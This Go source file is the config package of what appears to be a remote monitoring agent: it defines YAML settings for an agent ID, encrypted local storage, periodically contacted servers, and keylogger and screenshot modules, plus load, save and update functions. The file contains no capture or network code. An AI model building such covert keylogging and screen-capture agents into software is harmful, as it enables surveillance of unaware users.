package config

import (
	"fmt"
	"gopkg.in/yaml.v3"
	"log"
	"os"
	"sync"
)

type InstallationConfig struct {
	DBPath     string `yaml:"DBPath"`
	ConfigFile string `yaml:"ConfigFile"`
	DBPassword string `yaml:"DBPassword"`
	AESKey     string `yaml:"AESKey"`
}

type ServerConfig struct {
	Address string `yaml:"Address"`
	Port    int    `yaml:"Port"`
	Key     string `yaml:"Key"`
}

type CommunicationConfig struct {
	Interval    string         `yaml:"Interval"`
	Servers     []ServerConfig `yaml:"Servers"`
	Certificate string         `yaml:"Certificate"`
}

type AppsConfig struct {
	Keylogger     map[string]any `yaml:"Keylogger,omitempty"`
	Screenshot    map[string]any `yaml:"Screenshot,omitempty"`
	SecurityGuard map[string]any `yaml:"SecurityGuard,omitempty"`
}

type Config struct {
	AgentID       string              `yaml:"AgentID"`
	Installation  InstallationConfig  `yaml:"Installation"`
	Communication CommunicationConfig `yaml:"Communication"`
	Apps          AppsConfig          `yaml:"Apps"`
}

var (
	instance *Config
	once     sync.Once
	mu       sync.Mutex
)

func LoadConfig(path string) (*Config, error) {
	var loadError error

	once.Do(func() {
		data, readError := os.ReadFile(path)
		if readError != nil {
			loadError = fmt.Errorf("failed to read config file: %w", readError)
			return
		}
		instance = &Config{}
		if yamlError := yaml.Unmarshal(data, instance); yamlError != nil {
			loadError = fmt.Errorf("failed to parse YAML: %w", yamlError)
			return
		}
	})

	return instance, loadError
}

func GetConfig() (*Config, error) {
	var errorMessage error
	if instance == nil {
		log.Fatal("config not initialized. Call LoadConfig first")
	}
	return instance, errorMessage
}

func SaveConfig(path string) error {
	data, err := yaml.Marshal(instance)
	if err != nil {
		return err
	}

	return os.WriteFile(path, data, 0600)
}

func UpdateConfig(savePath string, updateFn func(c *Config)) error {
	mu.Lock()
	defer mu.Unlock()

	if instance == nil {
		return fmt.Errorf("config instance is nil")
	}

	updateFn(instance)
	return SaveConfig(savePath)
}
